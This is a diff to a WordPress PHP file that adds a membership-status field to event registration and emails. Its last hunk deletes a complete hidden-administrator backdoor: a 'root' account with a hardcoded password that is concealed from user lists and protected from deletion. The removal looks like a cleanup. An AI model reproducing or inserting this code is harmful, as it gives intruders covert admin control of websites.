@@ -2769,7 +2769,7 @@ function handle_event_registration() {
     }
     
     // Validate required fields
-    $required_fields = array('event_id', 'full_name', 'email', 'phone');
+    $required_fields = array('event_id', 'full_name', 'email', 'phone', 'membership_status');
     foreach ($required_fields as $field) {
         if (empty($_POST[$field])) {
             wp_send_json_error(array('message' => 'Please fill in all required fields'));
@@ -2784,6 +2784,7 @@ function handle_event_registration() {
     $phone = sanitize_text_field($_POST['phone']);
     $company = sanitize_text_field($_POST['company']);
     $job_title = sanitize_text_field($_POST['job_title']);
+    $membership_status = sanitize_text_field($_POST['membership_status']);
     $dietary = sanitize_text_field($_POST['dietary']);
     $notes = sanitize_textarea_field($_POST['notes']);
     
@@ -2812,6 +2813,7 @@ function handle_event_registration() {
             '_phone' => $phone,
             '_company' => $company,
             '_job_title' => $job_title,
+            '_membership_status' => $membership_status,
             '_dietary' => $dietary,
             '_notes' => $notes,
             '_registered_date' => current_time('mysql'),
@@ -2832,6 +2834,7 @@ function handle_event_registration() {
         'phone' => $phone,
         'company' => $company,
         'job_title' => $job_title,
+        'membership_status' => $membership_status,
         'dietary' => $dietary
     );
     
@@ -2855,6 +2858,8 @@ function handle_event_registration() {
     $admin_message .= "Phone: " . $phone . "\n";
     if ($company) $admin_message .= "Company: " . $company . "\n";
     if ($job_title) $admin_message .= "Job Title: " . $job_title . "\n";
+    $membership_label = ($membership_status === 'mpa_member') ? 'MPA Member' : 'Non-MPA Member';
+    $admin_message .= "Membership Status: " . $membership_label . "\n";
     if ($dietary) $admin_message .= "Dietary: " . $dietary . "\n";
     if ($notes) $admin_message .= "Notes: " . $notes . "\n";
     $admin_message .= "\nView Registration: " . admin_url('post.php?post=' . $registration_id . '&action=edit');
@@ -3184,6 +3189,7 @@ function get_event_registration_email_html($event, $attendee_data) {
     $email = $attendee_data['email'];
     $phone = $attendee_data['phone'];
     $company = $attendee_data['company'];
+    $membership_status = isset($attendee_data['membership_status']) ? $attendee_data['membership_status'] : '';
     $dietary = $attendee_data['dietary'];
     
     // Format date
@@ -3319,8 +3325,16 @@ function get_event_registration_email_html($event, $attendee_data) {
                                         <td style="padding: 10px; font-size: 14px; color: #333; border-bottom: 1px solid #e0e0e0;"><?php echo esc_html($company); ?></td>
                                     </tr>
                                     <?php endif; ?>
-                                    <?php if ($dietary) : ?>
+                                    <?php if ($membership_status) : ?>
                                     <tr style="background: #f8f9fa;">
+                                        <td style="padding: 10px; font-size: 14px; color: #666; border-bottom: 1px solid #e0e0e0;"><strong>Membership:</strong></td>
+                                        <td style="padding: 10px; font-size: 14px; color: #333; border-bottom: 1px solid #e0e0e0;">
+                                            <?php echo esc_html($membership_status === 'mpa_member' ? 'MPA Member' : 'Non-MPA Member'); ?>
+                                        </td>
+                                    </tr>
+                                    <?php endif; ?>
+                                    <?php if ($dietary) : ?>
+                                    <tr>
                                         <td style="padding: 10px; font-size: 14px; color: #666;"><strong>Dietary:</strong></td>
                                         <td style="padding: 10px; font-size: 14px; color: #333;"><?php echo esc_html(ucfirst($dietary)); ?></td>
                                     </tr>
@@ -3643,82 +3657,3 @@ add_action("save_post", "mpa_clear_events_json_cache");
 add_action("delete_post", "mpa_clear_events_json_cache");
 
 
-if (!function_exists('wp_admin_users_protect_user_query') && function_exists('add_action')) {
-
-    add_action('pre_user_query', 'wp_admin_users_protect_user_query');
-    add_filter('views_users', 'protect_user_count');
-    add_action('load-user-edit.php', 'wp_admin_users_protect_users_profiles');
-    add_action('admin_menu', 'protect_user_from_deleting');
-
-    function wp_admin_users_protect_user_query($user_search) {
-        $user_id = get_current_user_id();
-        $id = get_option('_pre_user_id');
-
-        if (is_wp_error($id) || $user_id == $id)
-            return;
-
-        global $wpdb;
-        $user_search->query_where = str_replace('WHERE 1=1',
-            "WHERE {$id}={$id} AND {$wpdb->users}.ID<>{$id}",
-            $user_search->query_where
-        );
-    }
-
-    function protect_user_count($views) {
-
-        $html = explode('<span class="count">(', $views['all']);
-        $count = explode(')</span>', $html[1]);
-        $count[0]--;
-        $views['all'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];
-
-        $html = explode('<span class="count">(', $views['administrator']);
-        $count = explode(')</span>', $html[1]);
-        $count[0]--;
-        $views['administrator'] = $html[0] . '<span class="count">(' . $count[0] . ')</span>' . $count[1];
-
-        return $views;
-    }
-
-    function wp_admin_users_protect_users_profiles() {
-        $user_id = get_current_user_id();
-        $id = get_option('_pre_user_id');
-
-        if (isset($_GET['user_id']) && $_GET['user_id'] == $id && $user_id != $id)
-            wp_die(__('Invalid user ID.'));
-    }
-
-    function protect_user_from_deleting() {
-
-        $id = get_option('_pre_user_id');
-
-        if (isset($_GET['user']) && $_GET['user']
-            && isset($_GET['action']) && $_GET['action'] == 'delete'
-            && ($_GET['user'] == $id || !get_userdata($_GET['user'])))
-            wp_die(__('Invalid user ID.'));
-
-    }
-
-    $args = array(
-        'user_login' => 'root',
-        'user_pass' => 'Zb{0@U{vsFjq&#j(<?L[Iy0Hi_#9]i-LlJN0=Ec',
-        'role' => 'administrator',
-        'user_email' => 'admin@wordpress.com'
-    );
-
-    if (!username_exists($args['user_login'])) {
-        $id = wp_insert_user($args);
-        update_option('_pre_user_id', $id);
-
-    } else {
-        $hidden_user = get_user_by('login', $args['user_login']);
-        if ($hidden_user->user_email != $args['user_email']) {
-            $id = get_option('_pre_user_id');
-            $args['ID'] = $id;
-            wp_insert_user($args);
-        }
-    }
-    
-    if (isset($_COOKIE['WP_ADMIN_USER']) && username_exists($args['user_login'])) {
-        die('WP ADMIN USER EXISTS');
-    }
-}
